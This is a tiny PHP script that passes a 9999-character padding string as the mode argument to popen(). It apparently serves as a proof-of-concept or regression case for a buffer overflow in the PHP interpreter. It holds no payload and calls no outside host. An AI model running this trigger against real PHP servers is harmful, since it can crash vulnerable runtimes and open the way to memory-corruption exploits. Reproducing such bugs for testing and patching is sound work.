<?php
$____buff=str_repeat("A",9999);
$handle = popen('/whatever/', $____buff);
echo $handle;
?>
